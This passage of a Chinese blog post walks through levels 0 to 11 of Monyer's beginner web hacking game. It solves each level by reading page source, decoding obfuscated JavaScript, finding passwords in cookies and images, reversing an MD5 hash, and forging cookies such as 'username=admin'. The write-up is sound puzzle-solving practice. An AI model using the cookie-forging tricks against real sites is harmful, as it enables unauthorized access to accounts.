第十五关\n\n![](/content/images/monyerhack/4.png)\n\n\n\n\n\n\n","slug":"再玩Monyer的Hack-Game","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xot002a5es5sowcs1dv","content":"<p>之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。</p>\n<a id=\"more\"></a>\n<h1 id=\"第零关\"><a href=\"#第零关\" class=\"headerlink\" title=\"第零关\"></a>第零关</h1><p><a href=\"http://monyer.com/game/game1/\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/</a></p>\n<blockquote>\n<p>请点击链接进入第1关： 连接在左边→ ←连接在右边</p>\n</blockquote>\n<p>可是我们看不到链接地址，直接打开审查工具。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>连接在左边→<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"first.php\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>←连接在右边<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>好的输入地址，我么进入第一关</p>\n<h1 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h1><p><a href=\"http://monyer.com/game/game1/first.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/first.php</a></p>\n<p>打开页面依然是什么都没有，这很正常。审查工具看代码。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/rocketscript\"</span> <span class=\"attr\">data-rocketoptimized</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value==<span class=\"string\">\"  \"</span>)&#123;</div><div class=\"line\">            <span class=\"built_in\">window</span>.location.href=<span class=\"string\">\"hello.php\"</span>;</div><div class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">            alert(<span class=\"string\">\"密码错误\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>好了 我们知道密码了，并且知道下一关的文件是hello.php</p>\n<h1 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h1><p><a href=\"http://monyer.com/game/game1/hello.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/hello.php</a></p>\n<p>审查工具看源代码，head中</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/rocketscript\"</span> <span class=\"attr\">data-rocketoptimized</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"built_in\">document</span>.oncontextmenu=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">return</span> <span class=\"literal\">false</span>&#125;;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">var</span> a,b,c,d,e,f,g;</div><div class=\"line\">    a = <span class=\"number\">3.14</span>;</div><div class=\"line\">    b = a * <span class=\"number\">2</span>;</div><div class=\"line\">    c = a + b;</div><div class=\"line\">    d = c / b + a;</div><div class=\"line\">    e = c - d * b + a;</div><div class=\"line\">    f = e + d /c -b * a;</div><div class=\"line\">    g = f * e - d + c * b + a;</div><div class=\"line\">    a = g * g;</div><div class=\"line\">    a = <span class=\"built_in\">Math</span>.floor(a);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"txt\"</span>).value==a)&#123;</div><div class=\"line\">            <span class=\"built_in\">window</span>.location.href=a + <span class=\"string\">\".php\"</span>;</div><div class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">            alert(<span class=\"string\">\"密码错误\"</span>);</div><div class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> a,b,c,d,e,f,g;</div><div class=\"line\">    a = <span class=\"number\">3.14</span>;</div><div class=\"line\">    b = a * <span class=\"number\">2</span>;</div><div class=\"line\">    c = a + b;</div><div class=\"line\">    d = c / b + a;</div><div class=\"line\">    e = c - d * b + a;</div><div class=\"line\">    f = e + d /c -b * a;</div><div class=\"line\">    g = f * e - d + c * b + a;</div><div class=\"line\">    a = g * g;</div><div class=\"line\">    a = <span class=\"built_in\">Math</span>.floor(a);</div><div class=\"line\">    </div><div class=\"line\"><span class=\"number\">424178</span></div></pre></td></tr></table></figure></p>\n<p>好的我们知道a的值是424178，输入，进入下一关</p>\n<h1 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h1><p><a href=\"http://monyer.com/game/game1/424178.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/424178.php</a></p>\n<p>head中存在js</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script type=<span class=\"string\">\"text/rocketscript\"</span> data-rocketoptimized=<span class=\"string\">\"true\"</span>&gt;</div><div class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">102</span>,<span class=\"number\">117</span>,<span class=\"number\">110</span>,<span class=\"number\">99</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">32</span>,<span class=\"number\">99</span>,<span class=\"number\">104</span>,<span class=\"number\">101</span>,<span class=\"number\">99</span>,<span class=\"number\">107</span>,<span class=\"number\">40</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">114</span>,<span class=\"number\">32</span>,<span class=\"number\">97</span>,<span class=\"number\">32</span>,<span class=\"number\">61</span>,<span class=\"number\">32</span>,<span class=\"number\">39</span>,<span class=\"number\">100</span>,<span class=\"number\">52</span>,<span class=\"number\">103</span>,<span class=\"number\">39</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">105</span>,<span class=\"number\">102</span>,<span class=\"number\">40</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">117</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">103</span>,<span class=\"number\">101</span>,<span class=\"number\">116</span>,<span class=\"number\">69</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">66</span>,<span class=\"number\">121</span>,<span class=\"number\">73</span>,<span class=\"number\">100</span>,<span class=\"number\">40</span>,<span class=\"number\">39</span>,<span class=\"number\">116</span>,<span class=\"number\">120</span>,<span class=\"number\">116</span>,<span class=\"number\">39</span>,<span class=\"number\">41</span>,<span class=\"number\">46</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">117</span>,<span class=\"number\">101</span>,<span class=\"number\">61</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">119</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">119</span>,<span class=\"number\">46</span>,<span class=\"number\">108</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">97</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">46</span>,<span class=\"number\">104</span>,<span class=\"number\">114</span>,<span class=\"number\">101</span>,<span class=\"number\">102</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">43</span>,<span class=\"number\">34</span>,<span class=\"number\">46</span>,<span class=\"number\">112</span>,<span class=\"number\">104</span>,<span class=\"number\">112</span>,<span class=\"number\">34</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">101</span>,<span class=\"number\">108</span>,<span class=\"number\">115</span>,<span class=\"number\">101</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">114</span>,<span class=\"number\">116</span>,<span class=\"number\">40</span>,<span class=\"number\">34</span>,<span class=\"number\">23494</span>,<span class=\"number\">30721</span>,<span class=\"number\">38169</span>,<span class=\"number\">35823</span>,<span class=\"number\">34</span>,<span class=\"number\">41</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">125</span>));</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div></pre></td></tr></table></figure>\n<p>新时代无须解释，直接上chrome consle<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">102</span>,<span class=\"number\">117</span>,<span class=\"number\">110</span>,<span class=\"number\">99</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">32</span>,<span class=\"number\">99</span>,<span class=\"number\">104</span>,<span class=\"number\">101</span>,<span class=\"number\">99</span>,<span class=\"number\">107</span>,<span class=\"number\">40</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">114</span>,<span class=\"number\">32</span>,<span class=\"number\">97</span>,<span class=\"number\">32</span>,<span class=\"number\">61</span>,<span class=\"number\">32</span>,<span class=\"number\">39</span>,<span class=\"number\">100</span>,<span class=\"number\">52</span>,<span class=\"number\">103</span>,<span class=\"number\">39</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">105</span>,<span class=\"number\">102</span>,<span class=\"number\">40</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">117</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">103</span>,<span class=\"number\">101</span>,<span class=\"number\">116</span>,<span class=\"number\">69</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">66</span>,<span class=\"number\">121</span>,<span class=\"number\">73</span>,<span class=\"number\">100</span>,<span class=\"number\">40</span>,<span class=\"number\">39</span>,<span class=\"number\">116</span>,<span class=\"number\">120</span>,<span class=\"number\">116</span>,<span class=\"number\">39</span>,<span class=\"number\">41</span>,<span class=\"number\">46</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">117</span>,<span class=\"number\">101</span>,<span class=\"number\">61</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">119</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">119</span>,<span class=\"number\">46</span>,<span class=\"number\">108</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">97</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">46</span>,<span class=\"number\">104</span>,<span class=\"number\">114</span>,<span class=\"number\">101</span>,<span class=\"number\">102</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">43</span>,<span class=\"number\">34</span>,<span class=\"number\">46</span>,<span class=\"number\">112</span>,<span class=\"number\">104</span>,<span class=\"number\">112</span>,<span class=\"number\">34</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">101</span>,<span class=\"number\">108</span>,<span class=\"number\">115</span>,<span class=\"number\">101</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">114</span>,<span class=\"number\">116</span>,<span class=\"number\">40</span>,<span class=\"number\">34</span>,<span class=\"number\">23494</span>,<span class=\"number\">30721</span>,<span class=\"number\">38169</span>,<span class=\"number\">35823</span>,<span class=\"number\">34</span>,<span class=\"number\">41</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">125</span>)</div></pre></td></tr></table></figure></p>\n<p>输出为<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"string\">'d4g'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value==a)&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">window</span>.location.href=a+<span class=\"string\">\".php\"</span>;</div><div class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">\t\talert(<span class=\"string\">\"密码错误\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>好了我们知道了，密码是d4g，下一关！</p>\n<h1 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h1><p><a href=\"http://monyer.com/game/game1/d4g.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/d4g.php</a></p>\n<p>这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。<br>打开后立即按esc停止。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script type=<span class=\"string\">\"text/rocketscript\"</span> data-rocketoptimized=<span class=\"string\">\"true\"</span>&gt;</div><div class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">p,a,c,k,e,d</span>)</span>&#123;e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>)</span>&#123;<span class=\"keyword\">return</span> c.toString(<span class=\"number\">36</span>)&#125;;<span class=\"keyword\">if</span>(!<span class=\"string\">''</span>.replace(<span class=\"regexp\">/^/</span>,<span class=\"built_in\">String</span>))&#123;<span class=\"keyword\">while</span>(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>)</span>&#123;<span class=\"keyword\">return</span> d[e]&#125;];e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">return</span><span class=\"string\">'\\\\w+'</span>&#125;;c=<span class=\"number\">1</span>&#125;;<span class=\"keyword\">while</span>(c--)<span class=\"keyword\">if</span>(k[c])p=p.replace(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">'\\\\b'</span>+e(c)+<span class=\"string\">'\\\\b'</span>,<span class=\"string\">'g'</span>),k[c]);<span class=\"keyword\">return</span> p&#125;(<span class=\"string\">'a=\"e\";d c()&#123;b(9.8(\\'7\\').6==a)&#123;5.4.3=a+\".2\"&#125;1&#123;0(\"密码错误\")&#125;&#125;'</span>,<span class=\"number\">15</span>,<span class=\"number\">15</span>,<span class=\"string\">'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'</span>.split(<span class=\"string\">'|'</span>),<span class=\"number\">0</span>,&#123;&#125;))</div><div class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></div></pre></td></tr></table></figure>\n<p>显然这是一个加密的js，我们需要解密，上解密工具：</p>\n<p><a href=\"http://tool.lu/js/\" target=\"_blank\" rel=\"external\">http://tool.lu/js/</a></p>\n<p>解密后：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">a = <span class=\"string\">\"3bhe\"</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value == a) &#123;</div><div class=\"line\">\t\t<span class=\"built_in\">window</span>.location.href = a + <span class=\"string\">\".php\"</span></div><div class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">\t\talert(<span class=\"string\">\"密码错误\"</span>)</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>密码是 3bhe 下一关</p>\n<p>诶？怎么不对？仔细检查源代码发现下面还有一行<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\"</span>);</div></pre></td></tr></table></figure></p>\n<p>解密！<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">a = a.toUpperCase() + <span class=\"number\">1</span>;</div></pre></td></tr></table></figure></p>\n<p>.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go</p>\n<h1 id=\"第五关\"><a href=\"#第五关\" class=\"headerlink\" title=\"第五关\"></a>第五关</h1><p><a href=\"http://monyer.com/game/game1/3BHE1.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/3BHE1.php</a></p>\n<blockquote>\n<p>密码在哪儿？额，我藏在页面里了哦！</p>\n</blockquote>\n<p>这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？</p>\n<p>找到了，在cookie里</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">monyer:the password for the next level is asdf</div></pre></td></tr></table></figure>\n<p>下一关！</p>\n<h1 id=\"第六关\"><a href=\"#第六关\" class=\"headerlink\" title=\"第六关\"></a>第六关</h1><p><a href=\"http://monyer.com/game/game1/asdf.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/asdf.php</a></p>\n<p>是个线索题目</p>\n<p>Get the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls …</p>\n<p>真蛋疼<br>把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。</p>\n<p>这个答案是；seventeen</p>\n<h1 id=\"第七关\"><a href=\"#第七关\" class=\"headerlink\" title=\"第七关\"></a>第七关</h1><p><a href=\"http://monyer.com/game/game1/seventeen7.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/seventeen7.php</a></p>\n<p>社工题</p>\n<p>先解密md5吧</p>\n<p>5e023995fb3f5e840ee684784f8f0799</p>\n<p><a href=\"http://www.somd5.com/\" target=\"_blank\" rel=\"external\">http://www.somd5.com/</a></p>\n<p>解密出  eighteen8</p>\n<p>下一关</p>\n<h1 id=\"第八关\"><a href=\"#第八关\" class=\"headerlink\" title=\"第八关\"></a>第八关</h1><p><a href=\"http://monyer.com/game/game1/eighteen8.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/eighteen8.php</a></p>\n<p>直接看到 一个404 不要着急 审查工具</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;p style=&quot;display:none&quot;&gt;</div><div class=\"line\">第8关</div><div class=\"line\">朋友您好，第8关欢迎您！</div><div class=\"line\">我对您的聪明才智感到惊讶！</div><div class=\"line\">相信我，现在世界上85%以上的人都在你之下，</div><div class=\"line\">所以你可以大步向前，义无反顾地进行你的事业了。</div><div class=\"line\">因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。</div><div class=\"line\">那么继续我们的约定，我将告诉你第9关的入口：</div><div class=\"line\">10000以内所有质数和.php</div><div class=\"line\">&lt;/p&gt;</div></pre></td></tr></table></figure>\n<p>10000以内所有质数和，so easy！写个javascript 算一下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">var sum = 0;</div><div class=\"line\">for (var i = 2; i &lt; 10000; i++) &#123;</div><div class=\"line\">\tvar flag = true;</div><div class=\"line\">\tfor (var j = 2; j &lt;= Math.sqrt(i); j++) &#123;</div><div class=\"line\">\t\tif (i % j == 0) flag = false ;</div><div class=\"line\">\t&#125;</div><div class=\"line\">    if(flag) &#123;sum = sum + i;&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">console.log(sum);</div><div class=\"line\"></div><div class=\"line\">5736396</div></pre></td></tr></table></figure>\n<p>下一关</p>\n<h1 id=\"第九关\"><a href=\"#第九关\" class=\"headerlink\" title=\"第九关\"></a>第九关</h1><p><a href=\"http://monyer.com/game/game1/5736396.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/5736396.php</a></p>\n<p>在命令行里输入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://monyer.com/game/game1/img/4681851790659554.jpg</div><div class=\"line\">cat 4681851790659554.jpg</div></pre></td></tr></table></figure></p>\n<p>密码藏在图片里<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">���^�v��*&#123;I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����</div><div class=\"line\">�Ǿ���ʽ�ʲô���ţ�</div><div class=\"line\">�ԣ�������������������......��</div><div class=\"line\">��ϲ�㣡</div><div class=\"line\">��ʮ������Ϊ��MonyerLikeYou_the10level</div><div class=\"line\">�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�</div><div class=\"line\">�����Լ���û��ģ�%</div></pre></td></tr></table></figure></p>\n<p>MonyerLikeYou_the10level</p>\n<h1 id=\"第十关\"><a href=\"#第十关\" class=\"headerlink\" title=\"第十关\"></a>第十关</h1><p><a href=\"http://monyer.com/game/game1/MonyerLikeYou_the10level.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/MonyerLikeYou_the10level.php</a></p>\n<blockquote>\n<p>当前用户身份为simpleuser 不是admin，无法显示下一关密码</p>\n</blockquote>\n<p>很显然这是一道session/cookie欺骗题</p>\n<p>在console里直接输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">document.cookie=&quot;username=admin&quot;</div></pre></td></tr></table></figure></p>\n<p>刷新</p>\n<blockquote>\n<p>好聪明哦！下一关密码为：doyouknow</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十一关\"><a href=\"#第十一关\" class=\"headerlink\" title=\"第十一关\"></a>第十一关</h1><p><a href=\"http://monyer.com/game/game1/doyouknow.php?action=show_login_false\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/doyouknow.php?action=show_login_false</a></p>\n<blockquote>\n<p>你的session不是passer，不能查看下一关密码</p>\n</blockquote>\n<p>在console里直接输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">document.cookie=&quot;username=passer&quot;</div></pre></td></tr></table></figure></p>\n<p>刷新，好像不对哦，monyer骗我，哼！</p>\n<p>再看标题 action=show_login_false </p>\n<p><a href=\"http://monyer.com/game/game1/doyouknow.php?action=show_login_true\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/doyouknow.php?action=show_login_true</a></p>\n<blockquote>\n<p>您的session为passer，所以您可以查看下一关密码：smartboy</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十二关\"><a href=\"#第十二关\" class=\"headerlink\" title=\"第十二关\"></a>第十二关</h1><p><a href=\"http://monyer.com/game/game1/smartboy.php\" target=\"_blank\" 